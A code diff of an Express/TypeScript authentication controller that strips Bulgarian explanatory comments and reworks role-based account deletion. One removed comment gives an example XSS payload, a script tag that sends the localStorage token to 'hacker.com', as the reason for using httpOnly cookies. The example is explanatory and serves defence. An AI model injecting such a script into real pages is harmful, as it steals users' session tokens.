@@ -1,55 +1,8 @@
 /**
- * ============================================
- * AUTHENTICATION CONTROLLER С HTTPONLY COOKIES
- * ============================================
+ * Authentication Controller
  *
- * ЗАЩО HTTPONLY COOKIES ЗА REFRESH TOKENS?
- *
- * localStorage VS httpOnly Cookies - СИГУРНОСТТА:
- *
- * 1. localStorage (ПРЕДИШЕН ПОДХОД):
- *    ❌ Достъпен от JavaScript (window.localStorage.getItem())
- *    ❌ Уязвим към XSS attacks
- *    ❌ Ако някой инжектира злонамерен JS код, може да открадне токена
- *    ❌ Примерен attack: <script>fetch('hacker.com', {body: localStorage.token})</script>
- *
- * 2. httpOnly Cookies (НОВ ПОДХОД):
- *    ✅ НЕ Е достъпен от JavaScript (document.cookie не го показва)
- *    ✅ Само браузърът има достъп
- *    ✅ Автоматично се изпраща при всяка заявка към domain
- *    ✅ Дори при XSS, hacker НЕ МОЖЕ да прочете cookie-то
- *    ✅ secure flag - само през HTTPS
- *    ✅ sameSite - защита от CSRF
- *
- * КАК РАБОТИ СЕГА:
- *
- * LOGIN:
- * 1. User влиза с email/password
- * 2. Backend създава access token (15min) И refresh token (30 days)
- * 3. Access token се връща в JSON response
- * 4. Refresh token се връща като httpOnly cookie
- * 5. Frontend запазва само access token в localStorage
- * 6. Refresh token е скрит в cookie (JavaScript не може да го чете)
- *
- * REFRESH:
- * 1. Access token изтича след 15min
- * 2. Frontend вика /auth/refresh (БЕЗ да изпраща нищо!)
- * 3. Браузърът АВТОМАТИЧНО изпраща refresh token cookie
- * 4. Backend чете cookie-то с req.cookies.refreshToken
- * 5. Връща нов access token
- *
- * LOGOUT:
- * 1. Frontend вика /auth/logout
- * 2. Backend изтрива refresh token от DB
- * 3. Backend добавя access token в blacklist
- * 4. Backend изтрива refresh token cookie (res.clearCookie)
- * 5. User е изцяло logout-нат
- *
- * COOKIE OPTIONS ОБЯСНЕНИЕ:
- * - httpOnly: true    → JavaScript НЕ МОЖЕ да чете
- * - secure: true      → Само HTTPS (production)
- * - sameSite: strict  → Само same-site requests (защита от CSRF)
- * - maxAge: 30 days   → Автоматично изтриване след 30 дни
+ * Uses httpOnly cookies for refresh tokens (XSS protection).
+ * Access tokens: 15 min, Refresh tokens: 30 days.
  */
 
 import { Request, Response } from 'express';
@@ -57,9 +10,8 @@ import crypto from 'crypto';
 import prisma from '../config/database';
 import { hashPassword, comparePassword } from '../utils/hashPassword';
 import { generateToken } from '../utils/generateToken';
-import { validateEmailDomain, isEmailUnique } from '../utils/emailValidator';
+import { validateEmailDomain } from '../utils/emailValidator';
 import logger from '../services/logger.service';
-// Импортираме token utility функциите
 import {
   createRefreshToken,
   validateRefreshToken,
@@ -68,9 +20,7 @@ import {
   blacklistToken,
 } from '../utils/tokenUtils';
 
-// ============================================
-// REGISTER (ADMIN и CLIENT) – БЕЗ email verification
-// ============================================
+// Register (ADMIN and CLIENT)
 export const register = async (req: Request, res: Response): Promise<void> => {
   try {
     const { email, password, role, firstName, lastName, phone } = req.body;
@@ -100,7 +50,7 @@ export const register = async (req: Request, res: Response): Promise<void> => {
       },
     });
 
-    // 🆕 Ако е CLIENT, създаваме и Client запис (БЕЗ serviceCompanyId)
+    // Create Client record if role is CLIENT
     if (role === 'CLIENT') {
       await prisma.client.create({
         data: {
@@ -109,12 +59,10 @@ export const register = async (req: Request, res: Response): Promise<void> => {
           phone: phone || '',
           email: email,
           userId: user.id,
-          // serviceCompanyId ще се добави по-късно вътре в системата
         },
       });
     }
 
-    // 🆕 Създаваме tokens и ги изпращаме като httpOnly cookies (като при login)
     const accessToken = generateToken(
       {
         userId: user.id,
@@ -125,9 +73,8 @@ export const register = async (req: Request, res: Response): Promise<void> => {
       '15m'
     );
 
-    const refreshToken = await createRefreshToken(user.id, 30); // 30 дни
+    const refreshToken = await createRefreshToken(user.id, 30);
 
-    // Изпращаме tokens като httpOnly cookies
     res.cookie('refreshToken', refreshToken.token, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
@@ -141,7 +88,6 @@ export const register = async (req: Request, res: Response): Promise<void> => {
       maxAge: 15 * 60 * 1000,
     });
 
-    // 🆕 БЕЗ token в JSON response (консистентно с login)
     res.status(201).json({
       message: 'User registered successfully',
       user: {
@@ -156,55 +102,11 @@ export const register = async (req: Request, res: Response): Promise<void> => {
   }
 };
 
-// ============================================
-// LOGIN (with rememberMe)
-// ============================================
-/**
- * КАК РАБОТИ НОВИЯТ LOGIN FLOW С REFRESH TOKENS:
- *
- * Преди имахме:
- * - Само access token (JWT) с дълъг expiration
- * - При logout не можехме да invalidate-нем токена
- * - Ако токен бъде откраднат, няма начин да го спрем
- *
- * Сега имаме TWO-TOKEN SYSTEM:
- *
- * 1. ACCESS TOKEN (JWT):
- *    - Кратък живот (15 минути)
- *    - Съдържа user данни (userId, role, etc.)
- *    - Изпраща се при всяка API заявка
- *    - НЕ СЕ СЪХРАНЯВА В DB (stateless)
- *
- * 2. REFRESH TOKEN:
- *    - Дълъг живот (30 дни)
- *    - Random string (не JWT)
- *    - СЪХРАНЯВА СЕ В DB
- *    - Използва се само за да обнови access token
- *    - Може да бъде revoke-нат (изтрит от DB)
- *
- * FLOW:
- * 1. User влиза с email/password
- * 2. Създаваме access token (15min) И refresh token (30 days)
- * 3. Връщаме и двата токена
- * 4. Frontend запазва access token в localStorage
- * 5. Frontend запазва refresh token в httpOnly cookie (по-сигурно)
- * 6. След 15 минути access token изтича
- * 7. Frontend вика /auth/refresh с refresh token
- * 8. Backend проверява refresh token в DB
- * 9. Ако е валиден - издава НОВ access token
- * 10. Repeat steps 6-9...
- *
- * ПРЕДИМСТВА:
- * - Ако access token бъде откраднат, той изтича след 15 min
- * - При logout можем да изтрием refresh token от DB
- * - При смяна на парола изтриваме ВСИЧКИ refresh tokens
- * - По-добра сигурност без да жертваме UX
- */
+// Login
 export const login = async (req: Request, res: Response): Promise<void> => {
   try {
     const { email, password, rememberMe, role: expectedRole } = req.body;
 
-    // 1. Намираме user-а
     const user = await prisma.user.findUnique({ where: { email } });
     if (!user) {
       res.status(401).json({ message: 'Invalid credentials' });
@@ -216,20 +118,17 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    // 2. Проверяваме паролата
     const isPasswordValid = await comparePassword(password, user.password);
     if (!isPasswordValid) {
       res.status(401).json({ message: 'Invalid credentials' });
       return;
     }
 
-    // Role validation - only if expectedRole is provided
-if (expectedRole && expectedRole !== user.role) {
+    if (expectedRole && expectedRole !== user.role) {
   res.status(403).json({ message: 'Избраната роля не съвпада с профила.' });
   return;
 }
 
-    // 3. Вземаме serviceCompanyId ако е нужно
     let serviceCompanyId: string | undefined;
 
     if (user.role === 'ADMIN') {
@@ -241,15 +140,11 @@ if (expectedRole && expectedRole !== user.role) {
       const worker = await prisma.worker.findUnique({
         where: { userId: user.id },
       });
-      // Worker може да не съществува ако е pending approval
-      // В този случай serviceCompanyId остава undefined
       if (worker) {
         serviceCompanyId = worker.serviceCompanyId ?? undefined;
       }
     }
 
-    // 4. Създаваме ACCESS TOKEN (кратък живот - 15 минути)
-    // Това е JWT който frontend изпраща при всяка заявка
     const accessToken = generateToken(
       {
         userId: user.id,
@@ -258,32 +153,25 @@ if (expectedRole && expectedRole !== user.role) {
         tokenVersion: user.tokenVersion,
         serviceCompanyId,
       },
-      '15m' // 15 минути!
+      '15m'
     );
 
-    // 5. Създаваме REFRESH TOKEN (дълъг живот - 30 дни)
-    // Този токен се запазва в DB и се използва за обновяване
     const refreshDays = rememberMe ? 30 : 1;
     const refreshToken = await createRefreshToken(user.id, refreshDays);
 
-    // 6. 🆕 Изпращаме refresh token като httpOnly cookie
-    // httpOnly означава че JavaScript НЕ МОЖЕ да чете cookie-то
-    // Това защитава от XSS attacks - дори да има XSS, hacker не може да открадне refresh token
     res.cookie('refreshToken', refreshToken.token, {
-      httpOnly: true, // JavaScript НЕ МОЖЕ да чете това cookie
-      secure: process.env.NODE_ENV === 'production', // Само HTTPS в production
-      sameSite: 'strict', // Защита от CSRF attacks
-      maxAge: refreshDays * 24 * 60 * 60 * 1000, // 30 дни в milliseconds
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: refreshDays * 24 * 60 * 60 * 1000,
     });
     res.cookie('accessToken', accessToken, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict',
-      maxAge: 15 * 60 * 1000, // 15 ??????
+      maxAge: 15 * 60 * 1000,
     });
 
-    // 7. 🆕 Връщаме response БЕЗ токени в JSON
-    // Токените са в httpOnly cookies, не ги изпращаме в JSON!
     res.status(200).json({
       message: 'Login successful',
       user: {
@@ -299,36 +187,7 @@ if (expectedRole && expectedRole !== user.role) {
   }
 };
 
-// ============================================
-// LOGOUT
-// ============================================
-/**
- * КАК РАБОТИ LOGOUT С BLACKLIST SYSTEM:
- *
- * Проблемът с JWT tokens:
- * - JWT токените са stateless (не се съхраняват в DB)
- * - След като бъдат издадени, сървърът ги приема докато не изтекат
- * - Не можем просто да "изтрием" JWT токен
- *
- * Решението - Token Blacklist:
- * - При logout добавяме текущия access token в blacklist таблица
- * - Също изтриваме refresh token от DB
- * - При всяка заявка auth middleware проверява дали токенът е blacklisted
- * - Ако е blacklisted - отказваме достъп
- *
- * FLOW:
- * 1. User вика /logout и изпраща access token в Authorization header
- * 2. Изтриваме refresh token от DB (ако има)
- * 3. Добавяме access token в blacklist с expiration date
- * 4. След expiration date можем да изтрием от blacklist (cleanup)
- * 5. От този момент токенът вече не работи
- *
- * ЗАЩО РАБОТИ:
- * - Refresh token вече не съществува → не може да обнови access token
- * - Access token е в blacklist → не може да се използва за API заявки
- * - След 15 минути access token изтича естествено
- * - Cleanup job изтрива старите blacklisted tokens
- */
+// Logout
 interface AuthRequest extends Request {
   user?: {
     userId: string;
@@ -339,7 +198,6 @@ interface AuthRequest extends Request {
 
 export const logout = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
-    // 1. Вземаме userId от authenticated request
     let userId = req.user?.userId;
     const refreshToken = req.cookies.refreshToken;
 
@@ -353,28 +211,17 @@ export const logout = async (req: AuthRequest, res: Response): Promise<void> => 
       return;
     }
 
-    // 2. Вземаме access token от Authorization header
-    // Format: "Bearer <token>"
     const authHeader = req.headers.authorization;
-    const accessToken = authHeader?.split(' ')[1]; // Вземаме само токена след "Bearer "
+    const accessToken = authHeader?.split(' ')[1];
 
-    // 3. 🆕 Вземаме refresh token от httpOnly cookie
-    // Сега refresh token идва от cookie, не от request body
-
-    // 4. Изтриваме refresh token от DB (ако е подаден)
-    // Това прави невъзможно обновяването на access token
     if (refreshToken) {
       await revokeRefreshToken(refreshToken);
     }
 
-    // 5. ????????? ??? access token (15 ??????)
-    // Това прави невъзможно използването му за API заявки
     if (accessToken) {
       await blacklistToken(accessToken, 'logout');
     }
 
-    // 6. 🆕 Изтриваме refresh token cookie
-    // Това изтрива cookie-то от browser-а    
     if (userId) {
       await prisma.user.update({
         where: { id: userId },
@@ -388,14 +235,12 @@ export const logout = async (req: AuthRequest, res: Response): Promise<void> => 
       sameSite: 'strict',
     });
 
-
     res.clearCookie('refreshToken', {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
       sameSite: 'strict',
     });
 
-    // 7. Успех!
     res.status(200).json({
       message: 'Logged out successfully',
     });
@@ -405,12 +250,11 @@ export const logout = async (req: AuthRequest, res: Response): Promise<void> => 
   }
 };
 
-// ============================================
-// DELETE ACCOUNT (Self-Service)
-// ============================================
+// Delete Account
 export const deleteAccount = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
     const userId = req.user!.userId;
+    const userRole = req.user!.role;
 
     const user = await prisma.user.findUnique({
       where: { id: userId },
@@ -421,37 +265,113 @@ export const deleteAccount = async (req: AuthRequest, res: Response): Promise<vo
       return;
     }
 
-    const worker = await prisma.worker.findUnique({
-      where: { userId },
-      include: {
-        mechanicServiceCompanies: true,
-      },
-    });
+    // Handle MECHANIC role
+    if (userRole === 'MECHANIC') {
+      const worker = await prisma.worker.findUnique({
+        where: { userId },
+        include: {
+          mechanicServiceCompanies: true,
+        },
+      });
 
-    if (worker) {
-      const activeCount = worker.mechanicServiceCompanies.filter(
-        (m) => m.status === 'ACTIVE'
-      ).length;
+      if (worker) {
+        const activeCount = worker.mechanicServiceCompanies.filter(
+          (m) => m.status === 'ACTIVE'
+        ).length;
 
-      if (activeCount > 0) {
-        res.status(400).json({
-          message: 'Cannot delete account. You have active service memberships. Please leave all services first.',
-          activeServicesCount: activeCount,
+        if (activeCount > 0) {
+          res.status(400).json({
+            message: 'Не можете да изтриете акаунта си докато имате активни членства в сервизи. Моля, напуснете всички сервизи първо.',
+            activeServicesCount: activeCount,
+          });
+          return;
+        }
+
+        // Worker will be cascade deleted with user (onDelete: Cascade in schema)
+        // Mark as deleted for history purposes before cascade
+        await prisma.worker.update({
+          where: { id: worker.id },
+          data: { deletedAt: new Date() },
         });
-        return;
+      }
+    }
+
+    // Handle CLIENT role
+    if (userRole === 'CLIENT') {
+      // Find all client records for this user
+      const clients = await prisma.client.findMany({
+        where: { userId },
+      });
+
+      // Check for active orders
+      for (const client of clients) {
+        const activeOrdersCount = await prisma.order.count({
+          where: {
+            clientId: client.id,
+            status: { in: ['WAITING', 'IN_PROGRESS', 'READY'] },
+          },
+        });
+
+        if (activeOrdersCount > 0) {
+          res.status(400).json({
+            message: 'Не можете да изтриете акаунта си докато имате активни поръчки. Моля, изчакайте завършването им.',
+            activeOrdersCount,
+          });
+          return;
+        }
       }
 
-      await prisma.worker.update({
-        where: { id: worker.id },
-        data: { deletedAt: new Date() },
+      // Soft delete all client records (preserve history for service companies)
+      // Disconnect userId so the user can be deleted
+      for (const client of clients) {
+        await prisma.client.update({
+          where: { id: client.id },
+          data: {
+            isActive: false,
+            deletedAt: new Date(),
+            userId: null, // Disconnect from user - allows email reuse
+          },
+        });
+      }
+
+      // Delete notifications for this user's clients
+      await prisma.notification.deleteMany({
+        where: {
+          clientId: { in: clients.map(c => c.id) },
+        },
       });
     }
 
-    await prisma.user.update({
-      where: { id: userId },
-      data: { isActive: false },
+    // Handle ADMIN role - don't allow deletion if they have a service company
+    if (userRole === 'ADMIN') {
+      const serviceCompany = await prisma.serviceCompany.findUnique({
+        where: { userId },
+      });
+
+      if (serviceCompany) {
+        res.status(400).json({
+          message: 'Не можете да изтриете акаунта си докато имате активен сервиз. Моля, свържете се с поддръжката.',
+        });
+        return;
+      }
+    }
+
+    // Delete pending requests for this email
+    await prisma.pendingRequest.deleteMany({
+      where: { email: user.email },
     });
 
+    // Delete all refresh tokens for this user
+    await prisma.refreshToken.deleteMany({
+      where: { userId },
+    });
+
+    // Actually DELETE the user record (not just deactivate)
+    await prisma.user.delete({
+      where: { id: userId },
+    });
+
+    // Clear cookies
     res.clearCookie('accessToken', {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
@@ -465,7 +385,7 @@ export const deleteAccount = async (req: AuthRequest, res: Response): Promise<vo
     });
 
     res.status(200).json({
-      message: 'Account deleted successfully',
+      message: 'Акаунтът е изтрит успешно',
     });
   } catch (error) {
     logger.error('Delete account error:', error);
@@ -473,45 +393,12 @@ export const deleteAccount = async (req: AuthRequest, res: Response): Promise<vo
   }
 };
 
-// ============================================
-// REFRESH TOKEN
-// ============================================
-/**
- * КАК РАБОТИ REFRESH TOKEN ENDPOINT:
- *
- * Защо е нужен?
- * - Access token изтича след 15 минути
- * - Не искаме user-ът да трябва да влиза отново всеки път
- * - Refresh token живее 30 дни и може да създаде нов access token
- *
- * FLOW:
- * 1. Frontend вика API заявка
- * 2. Получава 401 Unauthorized (защото access token е изтекъл)
- * 3. Автоматично вика /auth/refresh с refresh token
- * 4. Backend проверява refresh token в DB
- * 5. Ако е валиден - издава НОВ access token
- * 6. Frontend запазва новия access token
- * 7. Frontend повтаря оригиналната заявка с новия токен
- * 8. Success!
- *
- * СИГУРНОСТ:
- * - Refresh token се съхранява само в DB (може да бъде revoke-нат)
- * - Проверяваме дали не е изтекъл
- * - Проверяваме дали user-ът е активен
- * - При logout изтриваме refresh token
- * - При смяна на парола изтриваме ВСИЧКИ refresh tokens
- *
- * REFRESH TOKEN ROTATION (optional advanced feature):
- * - Можем да създаваме НОВ refresh token при всяка употреба
- * - Така ако стар refresh token бъде откраднат, ще видим че се използва 2 пъти
- * - За простота засега не го правим, но е добра идея за production
- */
+// Refresh Token
 export const refreshToken = async (
   req: Request,
   res: Response
 ): Promise<void> => {
   try {
-    // 1. Get refresh token from httpOnly cookie
     const token = req.cookies.refreshToken;
 
     if (!token) {
@@ -552,8 +439,6 @@ export const refreshToken = async (
     }
 
     const user = refreshRecord.user;
-
-    // 4. Load serviceCompanyId when needed
     let serviceCompanyId: string | undefined;
 
     if (user.role === 'ADMIN') {
@@ -565,14 +450,11 @@ export const refreshToken = async (
       const worker = await prisma.worker.findUnique({
         where: { userId: user.id },
       });
-      // Worker може да не съществува ако е pending approval
-      // В този случай serviceCompanyId остава undefined
       if (worker) {
         serviceCompanyId = worker.serviceCompanyId ?? undefined;
       }
     }
 
-    // 5. Create new access token (15 minutes)
     const newAccessToken = generateToken(
       {
         userId: user.id,
@@ -584,7 +466,6 @@ export const refreshToken = async (
       '15m'
     );
 
-    // 6. Refresh token rotation - keep original expiry
     const refreshMaxAgeMs = refreshRecord.expiresAt.getTime() - Date.now();
     if (refreshMaxAgeMs <= 0) {
       res.status(401).json({ message: 'Invalid or expired refresh token' });
@@ -616,8 +497,6 @@ export const refreshToken = async (
       maxAge: 15 * 60 * 1000,
     });
 
-    // 🆕 Връщаме response БЕЗ accessToken в JSON
-    // Новият accessToken е в httpOnly cookie
     res.status(200).json({
       message: 'Token refreshed successfully',
     });
@@ -627,9 +506,7 @@ export const refreshToken = async (
   }
 };
 
-// ============================================
-// REGISTER MECHANIC
-// ============================================
+// Register Mechanic
 export const registerMechanic = async (
   req: Request,
   res: Response
@@ -671,7 +548,6 @@ export const registerMechanic = async (
 
     const hashedPassword = await hashPassword(password);
 
-    // Use transaction to create user, worker, and pending request together
     const user = await prisma.$transaction(async (tx) => {
       const newUser = await tx.user.create({
         data: {
@@ -681,7 +557,6 @@ export const registerMechanic = async (
         },
       });
 
-      // Създай Worker веднага (isActive: false - чака одобрение)
       const worker = await tx.worker.create({
         data: {
           firstName,
@@ -692,11 +567,10 @@ export const registerMechanic = async (
           skills: skills ?? null,
           userId: newUser.id,
           serviceCompanyId: serviceCompany.id,
-          isActive: false, // Чака одобрение от admin
+          isActive: false,
         },
       });
 
-      // Създай PendingRequest (за admin approval flow)
       await tx.pendingRequest.create({
         data: {
           email,
@@ -710,12 +584,11 @@ export const registerMechanic = async (
         },
       });
 
-      // Създай MechanicServiceCompany запис (status: PENDING)
       await tx.mechanicServiceCompany.create({
         data: {
           workerId: worker.id,
           serviceCompanyId: serviceCompany.id,
-          status: 'PENDING', // Чака одобрение
+          status: 'PENDING',
         },
       });
 
@@ -732,18 +605,15 @@ export const registerMechanic = async (
   }
 };
 
-// ============================================
-// ADD SERVICE COMPANY TO CLIENT
-// ============================================
+// Add Service Company to Client
 export const addServiceCompanyToClient = async (
   req: Request,
   res: Response
 ): Promise<void> => {
   try {
     const { uniqueCode, phone, firstName, lastName } = req.body;
-    const userId = (req as any).user.userId;
+    const userId = (req as AuthRequest).user?.userId;
 
-    // Валидация на телефонен номер
     if (!phone || phone.trim().length === 0) {
       res.status(400).json({ message: 'Phone number is required' });
       return;
@@ -799,9 +669,7 @@ export const addServiceCompanyToClient = async (
   }
 };
 
-// ============================================
-// FORGOT PASSWORD
-// ============================================
+// Forgot Password
 export const forgotPassword = async (
   req: Request,
   res: Response
@@ -819,8 +687,6 @@ export const forgotPassword = async (
 
     const resetCode = crypto.randomInt(100000, 999999).toString();
     const expiresAt = new Date(Date.now() + 15 * 60 * 1000);
-
-    // Hash the code before storing it
     const hashedCode = await hashPassword(resetCode);
 
     await prisma.passwordReset.create({
@@ -856,9 +722,7 @@ export const forgotPassword = async (
   }
 };
 
-// ============================================
-// RESET PASSWORD
-// ============================================
+// Reset Password
 export const resetPassword = async (
   req: Request,
   res: Response
@@ -872,7 +736,6 @@ export const resetPassword = async (
       return;
     }
 
-    // Find all valid password reset entries for this user
     const passwordResets = await prisma.passwordReset.findMany({
       where: {
         userId: user.id,
@@ -881,7 +744,6 @@ export const resetPassword = async (
       orderBy: { createdAt: 'desc' },
     });
 
-    // Check if any of the hashed tokens match
     let validPasswordReset = null;
     for (const reset of passwordResets) {
       const isCodeValid = await comparePassword(code, reset.token);
@@ -898,23 +760,15 @@ export const resetPassword = async (
 
     const hashedPassword = await hashPassword(newPassword);
 
-    // ВАЖНО: При смяна на парола трябва да:
-    // 1. Обновим паролата
-    // 2. Invalidate-нем ВСИЧКИ активни сесии (refresh tokens)
-    // Това е сигурностна мярка - ако някой е откраднал паролата,
-    // след смяната й всички негови сесии ще спрат да работят
     await prisma.user.update({
       where: { id: user.id },
       data: { password: hashedPassword },
     });
 
-    // Изтриваме използвания reset токен
     await prisma.passwordReset.delete({
       where: { id: validPasswordReset.id },
     });
 
-    // Изтриваме ВСИЧКИ refresh tokens на user-а
-    // Това логва out user-а от ВСИЧКИ devices
     await revokeAllUserRefreshTokens(user.id);
 
     res.status(200).json({
@@ -926,9 +780,7 @@ export const resetPassword = async (
   }
 };
 
-// ============================================
-// RESEND PASSWORD RESET CODE
-// ============================================
+// Resend Password Reset Code
 export const resendPasswordResetCode = async (
   req: Request,
   res: Response
@@ -946,8 +798,6 @@ export const resendPasswordResetCode = async (
 
     const resetCode = crypto.randomInt(100000, 999999).toString();
     const expiresAt = new Date(Date.now() + 15 * 60 * 1000);
-
-    // Hash the code before storing it
     const hashedCode = await hashPassword(resetCode);
 
     await prisma.passwordReset.create({
@@ -983,9 +833,7 @@ export const resendPasswordResetCode = async (
   }
 };
 
-// ============================================
-// REGISTER ADMIN WITH SERVICE COMPANY
-// ============================================
+// Register Admin with Service Company
 export const registerAdminWithCompany = async (
   req: Request,
   res: Response
@@ -1029,7 +877,6 @@ export const registerAdminWithCompany = async (
     const { generateUniqueCode } = await import('../utils/generateUniqueCode');
     const uniqueCode = generateUniqueCode();
 
-    // Use transaction to ensure both user and company are created together
     const result = await prisma.$transaction(async (tx) => {
       const user = await tx.user.create({
         data: {
@@ -1058,7 +905,6 @@ export const registerAdminWithCompany = async (
 
     const { user, serviceCompany } = result;
 
-    // Създаваме access token (15 minutes)
     const accessToken = generateToken(
       {
         userId: user.id,
@@ -1070,10 +916,8 @@ export const registerAdminWithCompany = async (
       '15m'
     );
 
-    // Създаваме refresh token (30 days)
     const refreshToken = await createRefreshToken(user.id);
 
-    // Изпращаме refresh token като httpOnly cookie
     res.cookie('refreshToken', refreshToken.token, {
       httpOnly: true,
       secure: process.env.NODE_ENV === 'production',
@@ -1088,8 +932,6 @@ export const registerAdminWithCompany = async (
       maxAge: 15 * 60 * 1000,
     });
 
-    // 🆕 Връщаме response БЕЗ accessToken в JSON
-    // accessToken е в httpOnly cookie
     res.status(201).json({
       message: 'Admin and service company created successfully',
       user: {
